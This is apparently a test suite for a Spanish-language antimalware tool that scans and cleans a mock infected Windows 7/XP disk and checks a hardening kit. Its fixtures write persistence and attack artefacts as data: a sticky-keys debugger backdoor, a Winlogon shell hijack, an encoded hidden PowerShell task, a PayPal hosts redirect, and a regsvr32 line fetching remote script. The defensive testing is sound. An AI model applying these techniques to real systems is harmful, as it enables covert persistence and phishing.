"""escudo windows: registro de Windows (regf) y análisis/limpieza de un Windows 7 infectado de mentira."""
import os
import random
import struct
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(Path(__file__).resolve().parent))
import colmena as C  # noqa: E402
from escudo import windows as W  # noqa: E402
from escudo.config import Config  # noqa: E402
from escudo.regf import Editor, Hive, RegfError  # noqa: E402
from escudo.scanner import Scanner  # noqa: E402
from escudo.signatures import EICAR  # noqa: E402

CV = r"Microsoft\Windows NT\CurrentVersion"


# --------------------------------------------------------------------------------------------------------------
# Lector y editor del registro
# --------------------------------------------------------------------------------------------------------------
def test_regf_lee_tipos_listas_y_datos_grandes():
    a = C.arbol(**{r"A\Run": {"x": "C:\\x.exe", "n": 7, "m": ["uno", "dos"], "e": (C.REG_EXPAND_SZ, C._sz("%a%")),
                              "q": (11, struct.pack("<Q", 1 << 40)), "": "predeterminado"},
                   "Grande": {"b": (C.REG_BINARY, os.urandom(40000))}})
    a["claves"]["Muchas"] = {"claves": {f"k{i}": {} for i in range(700)}}
    h = Hive(C.colmena(a, ri_cada=128))                       # «ri» → varias «li», como las colmenas grandes
    run = h.key(r"a\RUN")                                     # sin distinguir mayúsculas
    assert run.get("X") == "C:\\x.exe" and run.get("n") == 7 and run.get("m") == ["uno", "dos"]
    assert run.get("e") == "%a%" and run.get("q") == 1 << 40 and run.get("") == "predeterminado"
    assert len(h.key("Grande").value("b").raw) == 40000      # «db»: datos de más de 16 KB en segmentos
    assert len(h.key("Muchas").subkeys()) == 700
    assert h.key(r"A\No") is None and not h.sucia


def test_regf_resiste_colmenas_manipuladas():
    """Entrada hostil: cualquier corrupción da RegfError (o datos), nunca otra excepción ni un bucle."""
    a = C.arbol(**{r"A\B\C": {"v": "x" * 50, "d": 1}, "D": {"w": ["a"]}})
    a["claves"]["M"] = {"claves": {f"k{i}": {"valores": {"v": i}} for i in range(40)}}
    buena = C.colmena(a, ri_cada=8)
    rnd = random.Random(1234)
    for _ in range(1500):
        d = bytearray(buena)
        for _ in range(rnd.randint(1, 8)):
            i = rnd.randrange(4096, len(d))
            d[i] = rnd.randrange(256)
        try:
            h = Hive(bytes(d))
            for k in h.root.walk():
                for v in k.values():
                    v.texto()
        except RegfError:
            pass
    # Ciclo: una lista de subclaves que se apunta a sí misma
    h = Hive(buena)
    with pytest.raises(RegfError):
        Hive(b"xxxx" + buena[4:])
    lista = h.key("M").subkeys_off
    d = bytearray(buena)
    struct.pack_into("<I", d, 4096 + lista + 4 + 4, lista)   # primera entrada de la «ri» → la propia «ri»
    with pytest.raises(RegfError):
        Hive(bytes(d)).key("M").subkeys()


def test_editor_cambios_minimos(tmp_path):
    a = C.arbol(**{"W": {"Shell": "explorer.exe, C:\\ProgramData\\x.exe", "Userinit": "u", "Start": 2,
                         "Otro": "queda"}})
    p = tmp_path / "SOFTWARE"
    p.write_bytes(C.colmena(a))
    e = Editor(str(p))
    assert e.borrar_valor("W", "otro") and not e.borrar_valor("W", "no-existe")
    assert e.poner_cadena("W", "Shell", "explorer.exe") and e.poner_dword("W", "Start", 4)
    with pytest.raises(RegfError):
        e.poner_cadena("W", "Userinit", "C:\\Windows\\system32\\userinit.exe,")   # no cabe: no se reubica
    e.guardar()
    k = Hive.open(str(p)).key("W")
    assert k.get("Shell") == "explorer.exe" and k.get("Start") == 4 and k.get("Otro") is None
    assert k.get("Userinit") == "u" and os.path.getsize(p) == len(C.colmena(a))
    p.write_bytes(C.colmena(a, sucia=True))
    with pytest.raises(RegfError, match="pendientes"):
        Editor(str(p))                                        # Windows reaplicaría sus .LOG encima


# --------------------------------------------------------------------------------------------------------------
# Un Windows 7 infectado
# --------------------------------------------------------------------------------------------------------------
def _escribir(raiz: Path, rel: str, datos: bytes = b"MZ" + b"\0" * 200) -> Path:
    p = raiz / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(datos)
    return p


def _tarea(comando: str, args: str) -> bytes:
    xml = ('<?xml version="1.0" encoding="UTF-16"?>\n<Task version="1.2" '
           'xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Settings><Hidden>true</Hidden>'
           f'</Settings><Actions Context="Author"><Exec><Command>{comando}</Command><Arguments>{args}</Arguments>'
           '</Exec></Actions></Task>')
    return b"\xff\xfe" + xml.encode("utf-16-le")


def _lnk(destino: str, args: str = "") -> bytes:
    """Acceso directo mínimo con LinkInfo (ruta local) y argumentos."""
    base = destino.encode("cp1252") + b"\0"
    info = struct.pack("<IIIIIII", 0x1C + len(base), 0x1C, 1, 0, 0x1C, 0, 0) + base
    flags = 0x2 | 0x80 | (0x20 if args else 0)
    cab = struct.pack("<I16sI", 0x4C, b"\x01\x14\x02\0\0\0\0\0\xc0\0\0\0\0\0\0\x46", flags) + b"\0" * (0x4C - 24)
    cuerpo = info + (struct.pack("<H", len(args)) + args.encode("utf-16-le") if args else b"")
    return cab + cuerpo


def windows7(raiz: Path) -> Path:
    for f in ("cmd.exe", "userinit.exe", "svchost.exe", "sethc.exe", "bueno.dll", "drivers/ok.sys"):
        _escribir(raiz, f"Windows/System32/{f}")
    (raiz / "Windows/SysWOW64").mkdir(parents=True)
    _escribir(raiz, "Program Files/Legit/legit.exe")
    software = C.arbol(**{
        CV: {"ProductName": "Windows 7 Professional", "CurrentVersion": "6.1", "CSDVersion": "Service Pack 1",
             "CurrentBuildNumber": "7601", "SystemRoot": "C:\\Windows"},
        CV + r"\Winlogon": {"Shell": "explorer.exe, C:\\ProgramData\\x.exe",
                            "Userinit": "C:\\Windows\\system32\\userinit.exe,"},
        CV + r"\Image File Execution Options\sethc.exe": {"Debugger": "C:\\Windows\\System32\\cmd.exe"},
        CV + r"\Image File Execution Options\notepad.exe": {"UseFilter": 0},
        CV + r"\ProfileList": {"ProgramData": (C.REG_EXPAND_SZ, C._sz("%SystemDrive%\\ProgramData"))},
        CV + r"\ProfileList\S-1-5-21-1-2-3-1000": {"ProfileImagePath":
                                                  (C.REG_EXPAND_SZ, C._sz("%SystemDrive%\\Users\\ana"))},
        CV + r"\ProfileList\S-1-5-18": {"ProfileImagePath": "%systemroot%\\system32\\config\\systemprofile"},
        r"Microsoft\Windows\CurrentVersion": {"ProgramFilesDir": "C:\\Program Files"},
        r"Microsoft\Windows\CurrentVersion\Run": {"Legit": '"C:\\Program Files\\Legit\\legit.exe" /min'},
        r"Microsoft\Windows\CurrentVersion\Policies\System": {"EnableLUA": 0},
    })
    system = C.arbol(**{
        "Select": {"Current": 1},
        r"ControlSet001\Services\Falso": {"ImagePath": "C:\\ProgramData\\svchost.exe", "Start": 2, "Type": 16},
        r"ControlSet001\Services\Bueno": {"ImagePath": (C.REG_EXPAND_SZ,
                                                        C._sz("%SystemRoot%\\system32\\svchost.exe -k netsvcs")),
                                          "Start": 2, "Type": 32},
        r"ControlSet001\Services\Bueno\Parameters": {"ServiceDll": "%SystemRoot%\\system32\\bueno.dll"},
        r"ControlSet001\Services\Driver": {"ImagePath": "system32\\DRIVERS\\ok.sys", "Start": 0, "Type": 1},
        r"ControlSet001\Services\Viejo": {"ImagePath": "C:\\no\\existe.exe", "Start": 4, "Type": 16},
        r"ControlSet001\Control\Session Manager": {"BootExecute": ["autocheck autochk *"]},
        r"ControlSet001\Control\Lsa": {"Authentication Packages": ["msv1_0"],
                                       "Notification Packages": ["scecli", "mimilib"]},
        r"ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile": {"EnableFirewall": 0},
    })
    ntuser = C.arbol(**{
        r"Software\Microsoft\Windows\CurrentVersion\Run": {
            "Actualizador": "C:\\Users\\ana\\AppData\\Roaming\\upd.exe -silent"},
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders": {
            "AppData": "C:\\Users\\ana\\AppData\\Roaming", "Desktop": "C:\\Users\\ana\\Desktop",
            "Startup": "C:\\Users\\ana\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"},
        "Environment": {"TEMP": (C.REG_EXPAND_SZ, C._sz("%USERPROFILE%\\AppData\\Local\\Temp"))},
    })
    _escribir(raiz, "Windows/System32/config/SOFTWARE", C.colmena(software))
    _escribir(raiz, "Windows/System32/config/SYSTEM", C.colmena(system))
    _escribir(raiz, "Users/ana/NTUSER.DAT", C.colmena(ntuser))
    _escribir(raiz, "Users/ana/AppData/Roaming/upd.exe", EICAR)
    _escribir(raiz, "ProgramData/svchost.exe")
    _escribir(raiz, "ProgramData/x.exe")
    inicio = "Users/ana/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    _escribir(raiz, f"{inicio}/x.vbs", b'CreateObject("WScript.Shell").Run "calc"')
    _escribir(raiz, f"{inicio}/Legit.lnk", _lnk("C:\\Program Files\\Legit\\legit.exe", "/tray"))
    _escribir(raiz, f"{inicio}/desktop.ini", b"[.ShellClassInfo]")
    _escribir(raiz, "Users/ana/Downloads/factura.pdf.exe", EICAR)
    _escribir(raiz, "Users/ana/Documents/notas.txt", b"hola")
    _escribir(raiz, "Windows/System32/Tasks/Microsoft/Windows/Defrag/ScheduledDefrag",
              _tarea("%windir%\\system32\\defrag.exe", "-c"))
    _escribir(raiz, "Windows/System32/Tasks/Actualizar",
              _tarea("powershell.exe", "-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"))
    _escribir(raiz, "Windows/System32/drivers/etc/hosts",
              b"# hosts\r\n127.0.0.1 localhost\r\n6.6.6.6 www.paypal.com\r\n10.0.0.5 nas.casa\r\n")
    return raiz


@pytest.fixture
def scanner(tmp_path):
    return Scanner(Config(data_dir=tmp_path / "data", exclude_dirs=[], dry_run_firewall=True))


def _por_donde(hall):
    return {h.donde: h for h in hall}


def test_analisis_windows7_infectado(tmp_path, scanner):
    raiz = windows7(tmp_path / "disco")
    w = W.Windows(str(raiz))
    assert (w.producto, w.version, w.nt, w.unidad, w.x64) == ("Windows 7 Professional", "6.1", (6, 1), "C:", True)
    assert [u["nombre"] for u in w.usuarios] == ["ana"] and w.usuarios[0]["hive"] is not None
    assert w.env["programdata"] == "%SystemDrive%\\ProgramData" and w.local("%programdata%\\x.exe")
    hall = W.Analisis(w, scanner).ejecutar()
    d = _por_donde(hall)
    graves = {h.donde for h in hall if h.gravedad == "high"}

    shell = d[r"HKLM\…\Winlogon «Shell»"]
    assert shell.gravedad == "high" and shell.arreglo["dato"] == "explorer.exe"
    assert d[r"HKLM\…\Image File Execution Options\sethc.exe «Debugger»"].gravedad == "high"
    run = d[r"HKCU(ana)\Software\Microsoft\Windows\CurrentVersion\Run «Actualizador»"]
    assert run.gravedad == "high" and any("EICAR" in x for x in run.detecciones)
    assert run.archivo.endswith("AppData/Roaming/upd.exe")
    falso = d[r"HKLM\SYSTEM\…\Services\Falso"]
    assert falso.gravedad == "high" and any("se hace pasar" in m for m in falso.motivos)
    tarea = d["Tarea C:\\Windows\\System32\\Tasks\\Actualizar"]
    assert tarea.gravedad == "high" and "codificada" in " ".join(tarea.motivos)
    vbs = [h for h in hall if h.donde.endswith("Startup\\x.vbs")][0]
    assert vbs.gravedad == "high"
    descarga = [h for h in hall if h.tipo == "archivo" and "factura.pdf.exe" in h.donde][0]
    assert descarga.gravedad == "high"
    assert [h for h in hall if h.tipo == "hosts"][0].gravedad == "high"

    # Lo legítimo no se marca
    assert d[r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run «Legit»"].gravedad == "info"
    assert d[r"HKLM\SYSTEM\…\Services\Bueno"].gravedad == "info"
    assert d[r"HKLM\SYSTEM\…\Services\Bueno\Parameters «ServiceDll»"].gravedad == "info"
    assert d[r"HKLM\SYSTEM\…\Services\Driver"].gravedad == "info"
    assert d[r"HKLM\SYSTEM\…\Services\Viejo"].gravedad == "info"            # desactivado y sin archivo
    assert d["Tarea C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Defrag\\ScheduledDefrag"].gravedad == "low"
    lnk = [h for h in hall if h.donde.endswith("Legit.lnk")][0]
    assert lnk.gravedad == "info" and lnk.comando == '"C:\\Program Files\\Legit\\legit.exe" /tray'
    assert not any("desktop.ini" in h.donde or "notas.txt" in h.donde for h in hall)

    medias = {h.motivos[0] for h in hall if h.gravedad == "medium"}
    assert any("UAC" in m for m in medias) and any("cortafuegos" in m for m in medias)
    assert any("LSA" in m for m in medias)
    assert len(graves) == 8, graves
    texto = W.informe(w, hall)
    assert "8 graves" in texto and "no recibe parches" in texto


def test_limpieza_desactiva_y_se_puede_deshacer(tmp_path, scanner):
    raiz = windows7(tmp_path / "disco")
    w = W.Windows(str(raiz))
    hall = W.Analisis(w, scanner).ejecutar()
    hecho = W.limpiar(w, hall, log=lambda m: None)
    assert not hecho["errores"], hecho["errores"]

    sw = Hive.open(str(raiz / "Windows/System32/config/SOFTWARE"))
    assert sw.key(CV + r"\Winlogon").get("Shell") == "explorer.exe"
    assert sw.key(CV + r"\Image File Execution Options\sethc.exe").get("Debugger") is None
    assert sw.key(r"Microsoft\Windows\CurrentVersion\Run").get("Legit")               # lo legítimo, intacto
    nt = Hive.open(str(raiz / "Users/ana/NTUSER.DAT"))
    assert nt.key(r"Software\Microsoft\Windows\CurrentVersion\Run").get("Actualizador") is None
    sy = Hive.open(str(raiz / "Windows/System32/config/SYSTEM"))
    assert sy.key(r"ControlSet001\Services\Falso").get("Start") == 4
    assert sy.key(r"ControlSet001\Services\Bueno").get("Start") == 2

    for apartado in ("Users/ana/AppData/Roaming/upd.exe", "ProgramData/svchost.exe", "Users/ana/Downloads/"
                     "factura.pdf.exe", "Windows/System32/Tasks/Actualizar",
                     "Users/ana/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.vbs"):
        assert not (raiz / apartado).exists(), apartado
    for intacto in ("Windows/System32/cmd.exe", "Program Files/Legit/legit.exe",
                    "Windows/System32/Tasks/Microsoft/Windows/Defrag/ScheduledDefrag"):
        assert (raiz / intacto).exists(), intacto
    hosts = (raiz / "Windows/System32/drivers/etc/hosts").read_bytes()
    assert b"# (desactivado por TISMA Escudo) 6.6.6.6 www.paypal.com" in hosts and b"\n10.0.0.5 nas.casa" in hosts

    copias = Path(hecho["copias"])
    assert {p.name for p in copias.iterdir()} == {"SOFTWARE", "SYSTEM", "NTUSER.DAT-ana", "hosts"}
    assert Hive.open(str(copias / "SOFTWARE")).key(CV + r"\Winlogon").get("Shell").startswith("explorer.exe, ")

    # Tras limpiar no queda nada grave (las medias, como UAC, no se tocan sin --tambien-medias)
    despues = W.Analisis(W.Windows(str(raiz)), scanner).ejecutar()
    assert not [h.donde for h in despues if h.gravedad == "high"]
    assert any(h.gravedad == "medium" for h in despues)

    # Restaurar desde la cuarentena del propio disco
    from escudo.quarantine import Quarantine
    q = Quarantine(raiz / "TISMA-Cuarentena")
    item = [m for m in q.list() if m["original_path"].endswith("upd.exe")][0]
    q.restore(item["id"])
    assert (raiz / "Users/ana/AppData/Roaming/upd.exe").read_bytes() == EICAR


def test_tambien_medias(tmp_path, scanner):
    raiz = windows7(tmp_path / "disco")
    w = W.Windows(str(raiz))
    W.limpiar(w, W.Analisis(w, scanner).ejecutar(), niveles=("high", "medium"), log=lambda m: None)
    sw = Hive.open(str(raiz / "Windows/System32/config/SOFTWARE"))
    assert sw.key(r"Microsoft\Windows\CurrentVersion\Policies\System").get("EnableLUA") == 1
    sy = Hive.open(str(raiz / "Windows/System32/config/SYSTEM"))
    assert sy.key(r"ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile"
                  ).get("EnableFirewall") == 1


def test_windows_xp(tmp_path, scanner):
    raiz = tmp_path / "xp"
    _escribir(raiz, "WINDOWS/system32/userinit.exe")
    _escribir(raiz, "WINDOWS/system32/crypt32.dll")
    software = C.arbol(**{
        CV: {"ProductName": "Microsoft Windows XP", "CurrentVersion": "5.1", "CSDVersion": "Service Pack 3",
             "SystemRoot": "C:\\WINDOWS"},
        CV + r"\Winlogon": {"Shell": "Explorer.exe", "Userinit": "C:\\WINDOWS\\system32\\userinit.exe,"},
        CV + r"\Winlogon\Notify\crypt32chain": {"DLLName": "crypt32.dll"},
        CV + r"\Winlogon\Notify\malo": {"DLLName": "C:\\Documents and Settings\\pepe\\Datos de programa\\m.dll"},
        CV + r"\Windows": {"AppInit_DLLs": "C:\\WINDOWS\\system32\\hook.dll"},
        CV + r"\ProfileList": {"ProfilesDirectory": "%SystemDrive%\\Documents and Settings",
                               "AllUsersProfile": "All Users"},
        CV + r"\ProfileList\S-1-5-21-9-1003": {"ProfileImagePath": "%SystemDrive%\\Documents and Settings\\pepe"},
    })
    _escribir(raiz, "WINDOWS/system32/config/software", C.colmena(software))     # XP: nombres en minúsculas
    _escribir(raiz, "WINDOWS/system32/config/system", C.colmena(C.arbol(Select={"Current": 1})))
    _escribir(raiz, "Documents and Settings/pepe/NTUSER.DAT", C.colmena(C.arbol(**{
        r"Software\Microsoft\Windows NT\CurrentVersion\Windows": {"Load": "C:\\RECYCLER\\s.exe"}})))
    _escribir(raiz, "Documents and Settings/pepe/Datos de programa/m.dll")
    _escribir(raiz, "RECYCLER/s.exe")
    tarea = struct.pack("<HH", 1, 0) + b"\0" * 0x40 + struct.pack("<H", 0)
    app, par = "C:\\RECYCLER\\s.exe", "-q"
    tarea += struct.pack("<H", len(app) + 1) + (app + "\0").encode("utf-16-le")
    tarea += struct.pack("<H", len(par) + 1) + (par + "\0").encode("utf-16-le")
    _escribir(raiz, "WINDOWS/Tasks/At1.job", tarea)

    w = W.Windows(str(raiz))
    assert w.nt == (5, 1) and w.usuarios[0]["nombre"] == "pepe"
    assert w.env["allusersprofile"] == "%SystemDrive%\\Documents and Settings\\All Users"
    hall = W.Analisis(w, scanner).ejecutar()
    d = _por_donde(hall)
    assert d[r"HKLM\…\Winlogon\Notify\crypt32chain"].gravedad == "info"
    assert d[r"HKLM\…\Winlogon\Notify\malo"].gravedad in ("medium", "low")
    assert d[r"HKLM\…\Windows NT\CurrentVersion\Windows «AppInit_DLLs»"].gravedad == "high"   # XP: siempre activo
    load = [h for h in hall if h.donde.endswith("«Load»")][0]
    assert load.gravedad == "medium" and load.usuario == "pepe"
    job = d["Tarea C:\\WINDOWS\\Tasks\\At1.job"]
    assert job.comando == "C:\\RECYCLER\\s.exe -q" and job.gravedad in ("medium", "low")
    assert not any(h.gravedad == "high" and "Winlogon «Shell»" in h.donde for h in hall)     # «Explorer.exe»


def test_ordenes_y_rutas(tmp_path):
    assert W.programa('"C:\\Program Files\\A B\\x.exe" /s') == "C:\\Program Files\\A B\\x.exe"
    assert W.programa("C:\\Program Files\\A B\\x.exe /s") == "C:\\Program Files\\A B\\x.exe"
    assert W.objetivos("rundll32.exe C:\\Users\\a\\AppData\\x.dll,Inicio") == [
        "rundll32.exe", "C:\\Users\\a\\AppData\\x.dll"]
    assert W.objetivos('wscript.exe //B "C:\\Users\\a\\s.vbs"') == ["wscript.exe", "C:\\Users\\a\\s.vbs"]
    h = W.Hallazgo("inicio", "info", "x")
    W.evaluar_comando(h, "regsvr32 /s /n /u /i:http://x.y/z.sct scrobj.dll")
    assert h.gravedad == "high"
    raiz = windows7(tmp_path / "d")
    w = W.Windows(str(raiz))
    assert w.local("D:\\x.exe") is None and w.local("C:\\..\\..\\etc\\passwd") is None
    assert w.local("\\SystemRoot\\System32\\CMD.EXE").endswith("Windows/System32/cmd.exe")
    assert w.local("\\??\\C:\\Windows\\System32\\cmd.exe") and w.local("cmd")
    assert W.pe_firmado(str(raiz / "Windows/System32/cmd.exe")) is None              # no es un PE completo


def test_enlaces_no_salen_del_disco(tmp_path, scanner):
    raiz = windows7(tmp_path / "disco")
    fuera = tmp_path / "tisma-hosts"
    fuera.write_bytes(b"6.6.6.6 www.paypal.com\n")
    h = raiz / "Windows/System32/drivers/etc/hosts"
    h.unlink()
    h.symlink_to(fuera)                                   # unión maliciosa hacia el sistema que analiza
    (raiz / "Users/ana/Downloads/fuera").symlink_to(tmp_path)
    w = W.Windows(str(raiz))
    assert w.local("C:\\Windows\\System32\\drivers\\etc\\hosts") is None
    hall = W.Analisis(w, scanner).ejecutar()
    assert not [x for x in hall if x.tipo == "hosts"]
    W.limpiar(w, hall, niveles=("high", "medium"), log=lambda m: None)
    assert fuera.read_bytes() == b"6.6.6.6 www.paypal.com\n"


# --------------------------------------------------------------------------------------------------------------
# Kit de endurecimiento (los .bat se ejecutan en Windows: aquí, formato y reglas que evitan errores conocidos)
# --------------------------------------------------------------------------------------------------------------
KIT_SRC = Path(__file__).resolve().parents[3] / "windows"


def _construir_kit(destino: Path) -> Path:
    import importlib.util
    spec = importlib.util.spec_from_file_location("construir_kit", KIT_SRC / "construir-kit.py")
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    m.construir(str(destino))
    return destino


def test_kit_formato_y_reglas_de_cmd(tmp_path):
    import re
    kit = _construir_kit(tmp_path / "kit")
    bats = sorted(kit.glob("*.bat"))
    assert {b.name for b in bats} >= {"TISMA-Endurecer.bat", "TISMA-Permitir-Instalar.bat",
                                       "TISMA-Permitir-Programa.bat"}
    assert (kit / "LEEME.txt").read_bytes().startswith(b"\xef\xbb\xbf")
    for b in bats + [kit / "plantilla-deshacer.txt"]:
        datos = b.read_bytes()
        assert datos.isascii() and b"\n" not in datos.replace(b"\r\n", b""), b.name     # ASCII y CRLF
        texto = datos.decode().replace("\r\n", "\n")
        etiquetas = {m.lower() for m in re.findall(r"^:([A-Za-z_]\w*)", texto, re.M)} | {"eof"}
        for n, linea in enumerate(texto.split("\n"), 1):
            if linea.lstrip().lower().startswith("rem "):
                continue
            # && y || tras «reg» no son fiables en todos los cmd: siempre «if errorlevel»
            assert "&&" not in linea and "||" not in linea, f"{b.name}:{n}"
            # CALL vuelve a expandir los %: una ruta con %VARIABLE% llegaría vacía o rota
            if re.match(r"\s*call\s", linea, re.I):
                assert not re.search(r"%%[^%\s\"]+%%", linea), f"{b.name}:{n}"     # %%f (FOR) sí vale
            for destino in re.findall(r"\b(?:goto|call)\s+:(\w+)", linea, re.I):
                assert destino.lower() in etiquetas, f"{b.name}:{n} etiqueta {destino}"
        assert texto.count("(") - texto.count("^(") == texto.count(")") - texto.count("^)"), b.name


def test_kit_se_copia_al_disco_de_windows(tmp_path):
    kit = _construir_kit(tmp_path / "kit")
    raiz = windows7(tmp_path / "disco")
    w = W.Windows(str(raiz))
    assert W.instalar_kit(w, str(kit)) == "C:\\TISMA-Kit"
    assert (raiz / "TISMA-Kit" / "TISMA-Endurecer.bat").read_bytes() == (kit / "TISMA-Endurecer.bat").read_bytes()
    with pytest.raises(OSError):
        W.instalar_kit(w, str(tmp_path / "no-hay"))


def test_kit_reglas_srp_literales(tmp_path):
    """Las reglas guardan %TEMP%, %APPDATA%… tal cual (se resuelven por usuario), sin LNK en los tipos."""
    kit = _construir_kit(tmp_path / "kit")
    datos = (kit / "tisma-srp.reg").read_bytes()
    assert datos.startswith(b"\xff\xfe")
    texto = datos[2:].decode("utf-16-le")
    assert texto.startswith("Windows Registry Editor Version 5.00\r\n")

    def dec(h):
        return bytes(int(x, 16) for x in h.split(",")).decode("utf-16-le").rstrip("\0")
    rutas = [dec(h) for h in __import__("re").findall(r'"ItemData"=hex\(2\):([0-9a-f,]+)', texto)]
    assert "%TEMP%\\*.*" in rutas and "%USERPROFILE%\\Downloads" in rutas
    assert any(r.startswith("%HKEY_CURRENT_USER\\") and r.endswith("Local AppData%\\*.*") for r in rutas)
    assert len(rutas) == len(set(rutas)) == 15
    tipos = dec(__import__("re").search(r'"ExecutableTypes"=hex\(7\):([0-9a-f,]+)', texto).group(1)).split("\0")
    assert "EXE" in tipos and "VBS" in tipos and "LNK" not in tipos
